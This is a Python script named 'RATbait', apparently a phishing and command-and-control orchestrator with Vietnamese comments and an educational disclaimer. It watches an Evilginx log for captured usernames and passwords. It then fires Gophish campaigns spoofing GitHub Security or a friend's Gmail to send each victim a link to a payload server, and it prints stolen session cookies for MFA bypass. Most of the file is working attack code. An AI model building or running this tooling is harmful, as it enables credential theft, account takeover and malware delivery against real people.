# ======================================================================
# DISCLAIMER: This script is part of an educational Proof of Concept (PoC) project.
# It is intended strictly for authorized testing, malware analysis research,
# and educational purposes only. Do not use this for malicious activities.
# ======================================================================


# ========================================
# THƯ VIỆN CHUẨN
# ========================================

import time
import re
import requests
import urllib3
import json
import os
import sys
import threading
from dotenv import load_dotenv

# ==================================================
# CẤU HÌNH HỆ THỐNG VÀ MÀU SẮC
# ==================================================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
load_dotenv()

GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RED = '\033[91m'
WHITE = '\033[97m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
RESET = '\033[0m'

GOPHISH_API_URL = os.getenv('GOPHISH_API_URL', 'https://127.0.0.1:3333/api/campaigns/')
GOPHISH_API_KEY = os.getenv('GOPHISH_API_KEY', 'YOUR_API_KEY_HERE')
EVILGINX_DB_PATH = os.getenv('EVILGINX_DB_PATH', '/root/.evilginx/data.db')
PAYLOAD_URL = os.getenv('PAYLOAD_URL', 'http://YOUR_SERVER:PORT/payload.txt')

if os.geteuid() != 0:
    print(f"\n{RED}{BOLD}[-] FATAL ERROR: Access Denied.{RESET}")
    print(f"{YELLOW}    👉 Please try again with: {CYAN}sudo python3 {sys.argv[0]}{RESET}\n")
    sys.exit()

# ==================================================
# GIAO DIỆN ASCII ART & HEADER
# ==================================================
def show_banner():
    os.system('clear')
    banner = r'''
    ██████╗  █████╗ ████████╗██████╗  █████╗ ██╗████████╗
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║╚══██╔══╝
    ██████╔╝███████║   ██║   ██████╔╝███████║██║   ██║   
    ██╔══██╗██╔══██║   ██║   ██╔══██╗██╔══██║██║   ██║   
    ██║  ██║██║  ██║   ██║   ██████╔╝██║  ██║██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   
    yeah,  _   _
    right (,\_/, )
        \  | " |   .-'
           )\g/(  (       .----------.-----------.
          /(   )\  )     /   .=====;..   .-.    //
         |\)   (/|/     / .=//    ((()  |.o'\""//
         \   '   /     /   //    ((()~~/_o_O("//
      jgs (/---\)     /   '=====((()    """""//
                     /___________'__________//
                     `----------'----------'`
    '''
    print(f"{GREEN}{BOLD}{banner}{RESET}")
    print(f"{MAGENTA}      " + "—"*50)
    print(f"      {BOLD}{WHITE}[+] Automated Phishing & C2 Orchestrator [+]")
    print(f"      {BOLD}{WHITE}[+] Project: RATbait - Interactive v2.0 [+]")
    print(f"{MAGENTA}      " + "—"*50 + f"{RESET}")
    print(f"{YELLOW}      |      WARNING: FOR LAB PURPOSES ONLY      |{RESET}")
    print(f"{MAGENTA}      " + "—"*50 + f"{RESET}\n")

# ==================================================
# HÀM KÍCH HOẠT GOPHISH (BẮN 1 PHÁT)
# ==================================================
def fire_gophish(target_email, conf):
    headers = {'Authorization': GOPHISH_API_KEY}
    timestamp = int(time.time())
    
    group_name = f"Target_{target_email}_{timestamp}_{conf['mode_name'][:3]}"
    group_data = {"name": group_name, "targets": [{"first_name": "User", "email": target_email}]}
    requests.post('https://127.0.0.1:3333/api/groups/', json=group_data, headers=headers, verify=False)
    
    campaign_data = {
        "name": f"RATbait_{target_email}_{timestamp}_{conf['mode_name'][:3]}",
        "template": {"name": conf['template']},
        "page": {"name": "Blank Page"},
        "smtp": {"name": conf['smtp']},
        "url": PAYLOAD_URL,
        "groups": [{"name": group_name}]
    }
    camp_res = requests.post(GOPHISH_API_URL, json=campaign_data, headers=headers, verify=False)
    
    if camp_res.status_code == 201:
        print(f"\n{GREEN}{BOLD}[+] PAYLOAD SENT: {WHITE}{conf['mode_name']} -> {target_email}{RESET}")
    else:
        print(f"\n{RED}{BOLD}[-] GOPHISH API ERROR ({conf['mode_name']}): HTTP {camp_res.status_code}{RESET}")

# ==================================================
# HÀM BỘ ĐIỀU PHỐI (XỬ LÝ CHẾ ĐỘ COMBO)
# ==================================================
def trigger_payloads(target_email, config):
    print(f"\n{MAGENTA}[==================================================]{RESET}")
    print(f"{GREEN}{BOLD}[+] NEW TARGET HOOKED: {WHITE}{target_email}{RESET}")
    
    # Nếu config là list (Combo Mode), chạy từng cái
    if isinstance(config, list):
        print(f"{CYAN}[*] Activating COMBO MODE: Dual-stage attack...{RESET}")
        fire_gophish(target_email, config[0])
        print(f"{CYAN}[*] Waiting 30 seconds for natural delay...{RESET}")
        time.sleep(30)
        fire_gophish(target_email, config[1])
    else:
        fire_gophish(target_email, config)
    
    print(f"{MAGENTA}[==================================================]{RESET}")
    print(f"{YELLOW}RATbait > {WHITE}", end="", flush=True) # Trả lại dòng nhắc lệnh

# ==================================================
# LUỒNG 1: GIÁM SÁT DATABASE NGẦM (SNIFFER THREAD)
# ==================================================
def sniffer_thread(config):
    phished_users = set()
    regex = re.compile(r'"username":"([^"]+@[^"]+)","password":"[^"]+"')
    
    with open(EVILGINX_DB_PATH, 'r', encoding='utf-8', errors='ignore') as file:
        file.seek(0, 2)
        while True:
            line = file.readline()
            if not line:
                time.sleep(1)
                continue
            match = regex.search(line)
            if match:
                email = match.group(1)
                if email not in phished_users:
                    phished_users.add(email)
                    trigger_payloads(email, config)

# ==================================================
# TRÍCH XUẤT COOKIE
# ==================================================
def extract_cookies(target_email):
    print(f"{CYAN}[*] Retrieving Database for Cookies of: {WHITE}{target_email}{RESET}")
    found = False
    try:
        with open(EVILGINX_DB_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                # Lọc nhanh các dòng có cấu trúc JSON của Evilginx
                if line.startswith('{') and '"username"' in line:
                    try:
                        data = json.loads(line)
                        if data.get('username') == target_email:
                            tokens = data.get('tokens', {})
                            if tokens:
                                print(f"\n{GREEN}{BOLD}[+] SESSION COOKIES FOUND:{RESET}")
                                # In đẹp định dạng JSON Cookie
                                print(f"{WHITE}{json.dumps(tokens, indent=4)}{RESET}\n")
                                found = True
                                break # Tìm thấy bản ghi mới nhất thì dừng
                    except:
                        pass
    except Exception as e:
        print(f"{RED}[-] DB Access Error: {e}{RESET}")
    
    if not found:
        print(f"{YELLOW}[!] No valid Cookies found for this email. (Target may not have entered 2FA or login failed){RESET}")

# ==================================================
# LUỒNG 2: GIAO DIỆN TƯƠNG TÁC (INTERACTIVE CLI)
# ==================================================
def interactive_console():
    time.sleep(1) # Đợi Sniffer in xong thông báo khởi động
    print(f"\n{CYAN}--- Type 'help' to see command list ---{RESET}")
    while True:
        try:
            cmd = input(f"{YELLOW}RATbait > {WHITE}").strip()
            
            if cmd == "":
                continue
            elif cmd.lower() in ["exit", "quit", "0"]:
                print(f"\n{RED}[!] Shutting down orchestrator. We'll bait another time! {RESET}")
                os._exit(0)
            elif cmd.lower() == "help":
                print(f"\n{MAGENTA}--- AVAILABLE COMMANDS ---{RESET}")
                print(f"  {CYAN}show cookies <email>{RESET} : Extract Session Cookies for MFA bypass")
                print(f"  {CYAN}help{RESET}                 : Show this menu")
                print(f"  {CYAN}exit{RESET}                 : Shutdown tool\n")
            elif cmd.startswith("show cookies"):
                parts = cmd.split(" ")
                if len(parts) >= 3:
                    email_query = parts[2]
                    extract_cookies(email_query)
                else:
                    print(f"{RED}[-] Syntax Error. Example: show cookies victim@gmail.com{RESET}")
            else:
                print(f"{RED}[-] Invalid command. Type 'help' for info.{RESET}")
        
        except KeyboardInterrupt:
            print(f"\n\n{RED}[!] Connection terminated unexpectedly.{RESET}")
            os._exit(0)

# ==================================================
# ĐIỂM KHỞI CHẠY (MAIN ENTRY)
# ==================================================
if __name__ == "__main__":
    show_banner()
    if not os.path.exists(EVILGINX_DB_PATH):
        print(f"\n{RED}{BOLD}[-] FATAL ERROR: File {EVILGINX_DB_PATH} does not exist.{RESET}")
        sys.exit()

    print(f"{CYAN}[?] CHOOSE ATTACK MODE:{RESET}")
    print(f"  {WHITE}[1]{RESET} Enterprise Mode {CYAN}(GitHub Spoof - Single Shot){RESET}")
    print(f"  {WHITE}[2]{RESET} Friend Mode     {CYAN}(Friend Spoof - Single Shot){RESET}")
    print(f"  {WHITE}[3]{RESET} Combo Mode      {MAGENTA}(Dual-stage: Enterprise followed by Friend){RESET}")
    print(f"  {WHITE}[0]{RESET} Abort           {RED}(Exit){RESET}")
    
    choice = input(f"\n{YELLOW}[>] Your command: {WHITE}").strip()
    
    conf_enterprise = {'mode_name': 'ENTERPRISE MODE', 'template': 'Password Reset Lure', 'smtp': 'GitHub Security'}
    conf_friend = {'mode_name': 'FRIEND MODE', 'template': 'Friend Alert Lure', 'smtp': 'Gmail Profile'}
    
    if choice == '1':
        config = conf_enterprise
    elif choice == '2':
        config = conf_friend
    elif choice == '3':
        config = [conf_enterprise, conf_friend] # Combo truyền vào một list
    else:
        print(f"\n{RED}[-] Campaign aborted.{RESET}")
        sys.exit()

    print(f"\n{GREEN}[*] SYSTEM RUNNING. Sniffing data...feel free to interact with the console.{RESET}")

    # Kích hoạt luồng Sniffer chạy nền
    t = threading.Thread(target=sniffer_thread, args=(config,), daemon=True)
    t.start()

    # Kích hoạt giao diện gõ lệnh đè lên trên
    interactive_console()
